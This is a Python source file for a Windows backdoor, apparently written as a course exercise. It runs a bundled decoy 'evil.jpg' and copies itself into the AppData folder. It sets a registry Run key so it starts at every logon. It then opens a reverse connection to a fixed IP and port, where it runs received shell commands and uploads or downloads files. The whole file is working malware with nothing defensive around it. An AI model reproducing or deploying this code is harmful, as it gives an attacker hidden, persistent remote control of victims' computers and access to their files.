
import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdor:


    def __init__(self, ip, port):
        self.persistene()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persistene(self):
        evil_file_location = os.environ["appdata"] + "\\Windows_back.exe"
        print
        print(os.path.exists(evil_file_location))
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"')

    def wraper_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def wraper_receive(self):
        json_data=""
        while True:
            try:
                json_data = json_data+ self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] change working directory to: " + path

    def execute_command(self,command):
        execute_command=""
        for comm in command:
            execute_command = execute_command +" "+comm
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(execute_command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def read_file(self, path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Succefully "+path

    def run(self):
        while True:
            command = self.wraper_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                    result = "[+] Exiting ...."
                elif command[0] == "cd":
                    command_result=self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result=self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    print("\n[+] command to execute = " + str(command))
                    command_result = self.execute_command(command)
            except Exception:
                command_result="[+] Error during on command execution "+str(command)
            #print(command_result)
            self.wraper_send(command_result)
        self.connection.close()

file_name = sys._MEIPASS + "\evil.jpg"
print(file_name)
subprocess.Popen(file_name, shell=True)

try:
    my_backdor = Backdor("10.0.9.4",4546)
    my_backdor.run()
except Exception:
    sys.exit()